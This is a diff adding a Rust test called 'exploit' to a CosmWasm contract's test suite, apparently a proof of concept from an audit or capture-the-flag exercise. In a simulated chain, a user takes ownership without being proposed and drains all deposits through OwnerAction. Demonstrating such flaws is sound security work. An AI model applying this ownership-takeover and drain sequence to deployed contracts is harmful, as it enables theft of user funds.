@@ -230,4 +230,86 @@ pub mod tests {
             }
         );
     }
+
+    #[test]
+    fn exploit() {
+        let (mut app, contract_addr) = proper_instantiate();
+
+        // Initial state
+        let state: State = app
+            .wrap()
+            .query_wasm_smart(contract_addr.clone(), &QueryMsg::State {})
+            .unwrap();
+
+        assert_eq!(
+            state,
+            State {
+                current_owner: Addr::unchecked(ADMIN),
+                proposed_owner: None,
+            }
+        );
+
+        // User 1 deposit
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(10_000, DENOM)],
+        )
+        .unwrap();
+
+        // User 2 deposit
+        app.execute_contract(
+            Addr::unchecked(USER2),
+            contract_addr.clone(),
+            &ExecuteMsg::Deposit {},
+            &[coin(8_000, DENOM)],
+        )
+        .unwrap();
+
+        // change owner arbitrarily
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::AcceptOwnership {},
+            &[],
+        )
+        .unwrap();
+
+        let pwn_msg = cosmwasm_std::BankMsg::Send{
+            to_address: USER1.to_string(),
+            amount: vec![coin(Uint128::new(18_000).u128(), DENOM)],
+        };
+
+        // drain funds
+        app.execute_contract(
+            Addr::unchecked(USER1),
+            contract_addr.clone(),
+            &ExecuteMsg::OwnerAction {
+                msg: cosmwasm_std::CosmosMsg::Bank(pwn_msg.clone()),
+            },
+            &[],
+        )
+        .unwrap();
+
+        // Query balances
+        // we should have been able to take the contract total deposits
+        let bal = app.wrap().query_balance(USER1, DENOM).unwrap();
+        assert_eq!(bal.amount, Uint128::new(18_000));
+
+        // Final state
+        // we should be new owner
+        let state: State = app
+            .wrap()
+            .query_wasm_smart(contract_addr, &QueryMsg::State {})
+            .unwrap();
+
+        assert_eq!(
+            state,
+            State {
+                current_owner: Addr::unchecked(USER1),
+                proposed_owner: None,
+            }
+        );
+    }
 }
